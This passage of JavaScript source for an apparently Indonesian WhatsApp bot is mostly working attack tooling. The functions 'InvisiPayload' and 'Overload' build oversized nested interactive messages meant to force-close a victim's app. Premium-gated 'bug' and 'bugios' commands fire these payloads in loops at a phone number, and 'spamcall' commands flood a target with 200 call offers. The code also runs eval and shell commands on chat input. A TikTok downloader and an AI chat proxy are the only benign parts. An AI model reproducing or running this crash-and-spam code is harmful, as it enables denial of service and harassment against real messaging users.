        await XiosVirus(isTarget);
        await QDIphone(isTarget);
        await QPayIos(isTarget);
        await QPayStriep(isTarget);
        await FBiphone(isTarget);
        await VenCrash(isTarget);
        await AppXCrash(isTarget);
        await SmCrash(isTarget);
        await SqCrash(isTarget);
        await IosMJ(isTarget, true);
        await XiosVirus(isTarget);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }

async function InvisiPayload(isTarget) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        isTarget,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [isTarget],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: isTarget,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: isTarget }
      );

      await Rapip.relayMessage(isTarget, msg.message, {
        participant: { jid: isTarget },
        messageId: msg.key.id,
      });
    }

async function Overload(isTarget) {
let sections = [];
for (let i = 0; i < 1999; i++) {
let largeText = 'ᬿ'.repeat(5999);

let deepNested = {
title: `Section ${i + 1}`,
highlight_label: `Highlight ${i + 1}`,
rows: [{
title: largeText,
id: `id${i}`,
subrows: [
{
title: 'Nested row 1',
id: `nested_id1_${i}`,
subsubrows: [
{
title: 'Deep Nested row 1',
id: `deep_nested_id1_${i}`
},
{
title: 'Deep Nested row 2',
id: `deep_nested_id2_${i}`
}
]
},
{
title: 'Nested row 2',
id: `nested_id2_${i}`
}
]
}]
};

sections.push(deepNested);
}

let listMessage = {
title: "𝐎𝐕𝐄𝐑𝐅𝐋𝐎𝐖",
sections: sections
};

let msg = generateWAMessageFromContent(isTarget, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999
},
body: proto.Message.InteractiveMessage.Body.create({
text: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️" + "ꦾ".repeat(89999)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify(listMessage)
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify(listMessage),
subtitle: "᭰𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️" + "ᬿ".repeat(4999), 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}

]
})
})
}
}
}, {});

await Rapip.relayMessage(isTarget, msg.message, {
messageId: msg.key.id
});
console.log("Success! send bug!!")
}

case 'tiktok': 
      case'tt':{
        if (!qtext) return reply33(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await Rapip.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await Rapip.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await Rapip.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await Rapip.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await Rapip.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await Rapip.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return reply33('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await Rapip.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break

//END
// CASE SPAM CALL

case 'spamcall': {
if (!PremOnly) return reply33(`premium only`)
if (!q) return reply33("Example Use.\n calloffer 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply33(`*Success Send Spam Call To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 200; i++) {
await sendOfferCall(isTarget)
}
}
break
// VERSION VIDEO

case 'spamcallvid': {
if (!PremOnly) return reply33(`premium only`)
if (!q) return reply33("Example Use.\n calloffervideo 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply33(`*Success Send Spam Call Video To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 200; i++) {
await sendOfferVideoCall(isTarget)
}
}
break

//CASE BUG

case 'bug1':
case 'bug2':
case 'bug3':
case 'bug4':
case 'bug5':
case 'bug6':
{
if (!PremOnly) return reply33(`premium only`)
if (!q) return reply33(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply33(`*Error!*\n\n_Use : ${command} Number_\n_Example : Xs 62xx_\n\𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉`)
let isTarget = bijipler + '@s.whatsapp.net'
reply33(bugpip)
for (let i = 0; i < 40; i++) {
await Overload(isTarget)
await InvisiPayload(isTarget)
await Overload(isTarget)
await InvisiPayload(isTarget)
}
reply33(`[ ؆ ] _StatusBugWorking_
 _*\`Status\`*_ : ✅
> © 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️`)
}
break

case 'bugios1':
case 'bugios2':
case 'bugios3':
case 'bugios4':
case 'bugios5':
case 'bugios6':
{
if (!PremOnly) return reply33(`premium only`)
if (!q) return reply33(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply33(`*Error!*\n\n_Use : ${command} Number_\n_Example : Xs 62xx_\n\𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉`)
let isTarget = bijipler + '@s.whatsapp.net'
reply33(bugpip)
for (let i = 0; i < 10; i++) {
await BugIos(isTarget)
}
reply33(`[ ؆ ] _StatusBugWorking_
 _*\`Status\`*_ : ✅
> © 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️`)
}
break

//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply33(bang)}
try {
reply33(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply33(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply33(evaled)
} catch (err) {
await reply33(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return reply33(`${err}`)
if (stdout) return reply33(stdout)
})
}
//========================================================\\
}
} catch (err) {
Rapip.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\